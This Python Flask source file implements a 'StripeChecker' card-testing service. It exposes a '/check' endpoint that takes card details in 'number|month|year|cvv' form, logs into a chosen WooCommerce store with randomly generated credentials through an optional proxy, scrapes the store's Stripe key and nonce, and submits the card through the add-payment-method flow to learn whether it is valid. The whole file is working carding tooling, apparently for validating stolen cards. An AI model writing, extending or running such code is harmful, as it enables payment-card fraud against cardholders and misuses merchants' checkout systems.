from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
import uuid
import re
import json
import random
import string

app = Flask(__name__)

def random_gmail():
    user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{user}@gmail.com"

def random_password(length=12):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choices(chars, k=length))

class StripeChecker:
    def __init__(self, domain: str, username: str, password: str, proxy: str = None):
        self.domain = domain.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.stripe_pk = None
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }

    def _parse_value(self, data: str, start: str, end: str) -> str:
        try:
            start_pos = data.index(start) + len(start)
            end_pos = data.index(end, start_pos)
            return data[start_pos:end_pos]
        except ValueError:
            return "None"

    def login(self):
        login_url = f"{self.domain}/my-account/"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0"
        }
        res = self.session.get(login_url, headers=headers)
        soup = BeautifulSoup(res.text, 'html.parser')
        login_form = soup.find('form', {'class': 'login'})
        if not login_form:
            login_form = soup.find('form', {'id': lambda x: x and 'login' in x.lower()}) or \
                        soup.find('form', {'action': lambda x: x and 'login' in x.lower()}) or \
                        soup.find('form', {'method': 'post'})
            if not login_form:
                raise Exception("❌ Could not find any login form")
        hidden_inputs = login_form.find_all('input', {'type': 'hidden'})
        form_data = {input.get('name'): input.get('value') for input in hidden_inputs if input.get('name')}
        form_data.update({
            'username': self.username,
            'password': self.password,
            'login': 'Log in',
            'woocommerce-login-nonce': form_data.get('woocommerce-login-nonce', ''),
            '_wp_http_referer': form_data.get('_wp_http_referer', '/my-account/'),
        })
        headers["content-type"] = "application/x-www-form-urlencoded"
        headers["origin"] = self.domain
        headers["referer"] = login_url
        res = self.session.post(login_url, headers=headers, data=form_data)
        res = self.session.get(f"{self.domain}/my-account/add-payment-method/")
        match = re.search(r'wc_stripe_params\s*=\s*({[^}]+})', res.text)
        if match:
            try:
                params = json.loads(match.group(1))
                self.stripe_pk = params.get('key')
            except:
                pass
        if not self.stripe_pk:
            pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', res.text)
            if pk_match:
                self.stripe_pk = pk_match.group(0)
        if not self.stripe_pk:
            raise Exception("❌ Could not extract Stripe public key")

    def get_setup_nonce(self):
        res = self.session.get(f"{self.domain}/my-account/add-payment-method/")
        nonce = self._parse_value(res.text, '"createAndConfirmSetupIntentNonce":"', '"')
        return nonce

    def create_payment_method(self, card_number: str, exp_month: str, exp_year: str, cvv: str):
        headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": "Mozilla/5.0",
        }
        exp_year = exp_year[-2:] if len(exp_year) > 2 else exp_year
        data = {
            "type": "card",
            "card[number]": card_number,
            "card[cvc]": cvv,
            "card[exp_year]": exp_year,
            "card[exp_month]": exp_month,
            "billing_details[address][postal_code]": "99501",
            "billing_details[address][country]": "US",
            "payment_user_agent": "stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent",
            "key": self.stripe_pk,
            "_stripe_version": "2024-06-20",
        }
        res = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data
        )
        if res.status_code == 200:
            pm_id = res.json().get('id')
            return pm_id
        else:
            return None

    def confirm_setup_intent(self, payment_method_id: str, nonce: str):
        headers = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": self.domain,
            "referer": f"{self.domain}/my-account/add-payment-method/",
            "user-agent": "Mozilla/5.0",
            "x-requested-with": "XMLHttpRequest",
        }
        data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": payment_method_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }
        res = self.session.post(
            f"{self.domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
            headers=headers,
            data=data
        )
        return res.text

    def check_card(self, card_number: str, exp_month: str, exp_year: str, cvv: str) -> dict:
        try:
            self.login()
            nonce = self.get_setup_nonce()
            pm_id = self.create_payment_method(card_number, exp_month, exp_year, cvv)
            if not pm_id:
                return {
                    "success": False,
                    "message": "Failed to create payment method",
                    "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
                }
            result = self.confirm_setup_intent(pm_id, nonce)
            return {
                "success": "error" not in result.lower(),
                "message": result,
                "payment_method_id": pm_id,
                "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
            }
        except Exception as e:
            return {
                "success": False,
                "message": str(e),
                "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
            }

@app.route('/check', methods=['POST'])
def check():
    cc = request.form.get('cc') or request.json.get('cc')
    proxy = request.form.get('proxy') or request.json.get('proxy')
    site = request.form.get('site') or request.json.get('site')
    if not (cc and site):
        return jsonify({"error": "Missing required parameters: cc, site"}), 400
    try:
        number, month, year, cvv = cc.strip().split("|")
    except Exception:
        return jsonify({"error": "Invalid card format. Use number|month|year|cvv"}), 400
    gmail = random_gmail()
    passwd = random_password()
    checker = StripeChecker(site, gmail, passwd, proxy)
    result = checker.check_card(number, month, year, cvv)
    result['login_email'] = gmail
    result['login_password'] = passwd
    return jsonify(result)

if __name__ == '__main__':
    app.run(debug=True)
